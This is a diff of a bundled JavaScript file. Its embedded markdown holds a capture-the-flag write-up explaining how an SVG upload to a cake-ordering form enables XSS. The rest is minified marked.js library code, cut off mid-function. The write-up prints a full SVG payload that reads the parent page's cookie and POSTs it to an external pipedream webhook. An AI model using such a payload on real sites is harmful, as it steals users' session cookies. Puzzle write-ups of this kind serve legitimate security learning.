@@ -197,26 +197,27 @@ Success! This puzzle taught me so much about the internals of executables and di
 
 In this puzzle, we have a little cake ordering interface with some text inputs and an image input where we can upload a design. Upon submitting the input fields and design get sent to another client. Based on the prompt, we can assume the goal is to find a reflected XSS vulnerability. This would allow us to run arbitrary javascript on Vishy's browser.
 
-The trick here is to examine the image input more closely. Although the client only accepts png uploads, testing the upload endpoint reveals that the server accepts any image mimetype, including pngs, jpgs, gifs, and most importantly, svgs. Since svgs are an XML-based file format, we can embed script tags to insert our own javascript. However, the reason why the javascript will actually execute on the page is that they are rendered in a data URL with object tags. Therefore, the raw XML will be embedded in the page, causing the script to execute. 
+The trick here is to examine the image input more closely. Although the client only accepts png uploads, testing the upload endpoint reveals that the server accepts any image mimetype, including pngs, jpgs, gifs, and most importantly, svgs. Since svgs are an XML-based file format, we can embed script tags to insert our own javascript. However, the reason why the javascript will actually execute on the page is that they are rendered in a data URL with object tags. Therefore, the raw XML will be embedded in the page, causing the script to execute.
 
 Crafting our svg, we obtain the cookie from the main document with \`window.parent.document.cookie\` and then send the cookie to an external webhook. Once Vishy visits the page, the cookie data containing the flag is sent to our webhook.
 
 \`\`\`html
-<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" version="1.0" x="0.00000000" y="0.00000000" width="500.00000" height="500.00000" id="svg2">
-  <script type="text/javascript">
-    console.log(window.parent.document.cookie);
-    fetch("https://eohvmq4r3pcosx7.m.pipedream.net", {
-      method: 'POST',
-      crossorigin: true,  
-      mode: 'no-cors',
-      headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin':'*',
-      }, 
-      body: JSON.stringify(window.parent.document.cookie),
-    });
-  <\/script>
+<svg
+	xmlns:svg="http://www.w3.org/2000/svg"
+	xmlns="http://www.w3.org/2000/svg"
+	version="1.0"
+	x="0.00000000"
+	y="0.00000000"
+	width="500.00000"
+	height="500.00000"
+	id="svg2"
+>
+	<script type="text/javascript">
+		console.log(window.parent.document.cookie); fetch("https://eohvmq4r3pcosx7.m.pipedream.net", {
+		method: 'POST', crossorigin: true, mode: 'no-cors', headers: { 'Accept': 'application/json',
+		'Content-Type': 'application/json', 'Access-Control-Allow-Origin':'*', }, body:
+		JSON.stringify(window.parent.document.cookie), });
+	<\/script>
 </svg>
 \`\`\`
 `;function Ue(){return{async:!1,baseUrl:null,breaks:!1,extensions:null,gfm:!0,headerIds:!1,headerPrefix:"",highlight:null,hooks:null,langPrefix:"language-",mangle:!1,pedantic:!1,renderer:null,sanitize:!1,sanitizer:null,silent:!1,smartypants:!1,tokenizer:null,walkTokens:null,xhtml:!1}}let ie=Ue();function wt(s){ie=s}const kt=/[&<>"']/,cn=new RegExp(kt.source,"g"),_t=/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,un=new RegExp(_t.source,"g"),hn={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},nt=s=>hn[s];function H(s,e){if(e){if(kt.test(s))return s.replace(cn,nt)}else if(_t.test(s))return s.replace(un,nt);return s}const pn=/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/ig;function yt(s){return s.replace(pn,(e,t)=>(t=t.toLowerCase(),t==="colon"?":":t.charAt(0)==="#"?t.charAt(1)==="x"?String.fromCharCode(parseInt(t.substring(2),16)):String.fromCharCode(+t.substring(1)):""))}const gn=/(^|[^\[])\^/g;function v(s,e){s=typeof s=="string"?s:s.source,e=e||"";const t={replace:(n,i)=>(i=typeof i=="object"&&"source"in i?i.source:i,i=i.replace(gn,"$1"),s=s.replace(n,i),t),getRegex:()=>new RegExp(s,e)};return t}const dn=/[^\w:]/g,fn=/^$|^[a-z][a-z0-9+.-]*:|^[?#]/i;function st(s,e,t){if(s){let n;try{n=decodeURIComponent(yt(t)).replace(dn,"").toLowerCase()}catch{return null}if(n.indexOf("javascript:")===0||n.indexOf("vbscript:")===0||n.indexOf("data:")===0)return null}e&&!fn.test(t)&&(t=kn(e,t));try{t=encodeURI(t).replace(/%25/g,"%")}catch{return null}return t}const _e={},mn=/^[^:]+:\/*[^/]*$/,bn=/^([^:]+:)[\s\S]*$/,wn=/^([^:]+:\/*[^/]*)[\s\S]*$/;function kn(s,e){_e[" "+s]||(mn.test(s)?_e[" "+s]=s+"/":_e[" "+s]=xe(s,"/",!0)),s=_e[" "+s];const t=s.indexOf(":")===-1;return e.substring(0,2)==="//"?t?e:s.replace(bn,"$1")+e:e.charAt(0)==="/"?t?e:s.replace(wn,"$1")+e:s+e}const Ee={exec:()=>null};function it(s,e){const t=s.replace(/\|/g,(r,o,a)=>{let l=!1,c=o;for(;--c>=0&&a[c]==="\\";)l=!l;return l?"|":" |"}),n=t.split(/ \|/);let i=0;if(n[0].trim()||n.shift(),n.length>0&&!n[n.length-1].trim()&&n.pop(),e)if(n.length>e)n.splice(e);else for(;n.length<e;)n.push("");for(;i<n.length;i++)n[i]=n[i].trim().replace(/\\\|/g,"|");return n}function xe(s,e,t){const n=s.length;if(n===0)return"";let i=0;for(;i<n;){const r=s.charAt(n-i-1);if(r===e&&!t)i++;else if(r!==e&&t)i++;else break}return s.slice(0,n-i)}function _n(s,e){if(s.indexOf(e[1])===-1)return-1;const t=s.length;let n=0,i=0;for(;i<t;i++)if(s[i]==="\\")i++;else if(s[i]===e[0])n++;else if(s[i]===e[1]&&(n--,n<0))return i;return-1}function yn(s,e){!s||s.silent||(e&&console.warn("marked(): callback is deprecated since version 5.0.0, should not be used and will be removed in the future. Read more here: https://marked.js.org/using_pro#async"),(s.sanitize||s.sanitizer)&&console.warn("marked(): sanitize and sanitizer parameters are deprecated since version 0.7.0, should not be used and will be removed in the future. Read more here: https://marked.js.org/#/USING_ADVANCED.md#options"),(s.highlight||s.langPrefix!=="language-")&&console.warn("marked(): highlight and langPrefix parameters are deprecated since version 5.0.0, should not be used and will be removed in the future. Instead use https://www.npmjs.com/package/marked-highlight."),s.mangle&&console.warn("marked(): mangle parameter is enabled by default, but is deprecated since version 5.0.0, and will be removed in the future. To clear this warning, install https://www.npmjs.com/package/marked-mangle, or disable by setting `{mangle: false}`."),s.baseUrl&&console.warn("marked(): baseUrl parameter is deprecated since version 5.0.0, should not be used and will be removed in the future. Instead use https://www.npmjs.com/package/marked-base-url."),s.smartypants&&console.warn("marked(): smartypants parameter is deprecated since version 5.0.0, should not be used and will be removed in the future. Instead use https://www.npmjs.com/package/marked-smartypants."),s.xhtml&&console.warn("marked(): xhtml parameter is deprecated since version 5.0.0, should not be used and will be removed in the future. Instead use https://www.npmjs.com/package/marked-xhtml."),(s.headerIds||s.headerPrefix)&&console.warn("marked(): headerIds and headerPrefix parameters enabled by default, but are deprecated since version 5.0.0, and will be removed in the future. To clear this warning, install  https://www.npmjs.com/package/marked-gfm-heading-id, or disable by setting `{headerIds: false}`."))}function rt(s,e,t,n){const i=e.href,r=e.title?H(e.title):null,o=s[1].replace(/\\([\[\]])/g,"$1");if(s[0].charAt(0)!=="!"){n.state.inLink=!0;const a={type:"link",raw:t,href:i,title:r,text:o,tokens:n.inlineTokens(o)};return n.state.inLink=!1,a}return{type:"image",raw:t,href:i,title:r,text:H(o)}}function xn(s,e){const t=s.match(/^(\s+)(?:```)/);if(t===null)return e;const n=t[1];return e.split(`
